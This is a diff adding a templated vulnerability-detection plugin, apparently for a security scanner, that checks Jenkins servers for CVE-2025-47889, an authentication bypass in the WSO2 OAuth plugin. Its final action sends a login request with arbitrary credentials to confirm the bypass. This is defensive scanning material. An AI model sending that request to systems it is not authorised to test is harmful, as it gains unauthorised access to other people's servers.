@@ -1,0 +1,89 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Jenkins_CVE_2025_47889.textproto"
+  author: "alessandro-Doyensec"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-47889"
+  }
+  severity: CRITICAL
+  title: "Authentication bypass vulnerability in WSO2 Oauth Plugin (CVE-2025-47889)"
+  description: "In WSO2 Oauth Plugin 1.0 and earlier authentication claims are accepted without validation by the \"WSO2 Oauth\" security realm. This allows unauthenticated attackers to log in to controllers using this security realm using any username and any password, including usernames that do not exist."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-47889"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "jenkins_fingerprint"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>Dashboard [Jenkins]</title>" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "login_endpoint"
+  http_request: {
+    method: GET
+    uri: "/login?from=/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<form method=\"post\" name=\"login\" action=\"j_acegi_security_check\" style=\"text-size:smaller\">" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "login_with_arbitrary_credentials"
+  http_request: {
+    method: POST
+    uri: "/j_acegi_security_check"
+    data: "j_username=aaaa&j_password=aaaa&from=%2F&json=%7B%22j_username%22%3A+%22aaaa%22%2C+%22j_password%22%3A+%22aaaa%22%2C+%22from%22%3A+%22%2F%22%7D&Submit=log+in"
+    response: {
+      http_status: 302
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "jenkins_fingerprint",
+    "login_endpoint",
+    "login_with_arbitrary_credentials"
+  ]
+}
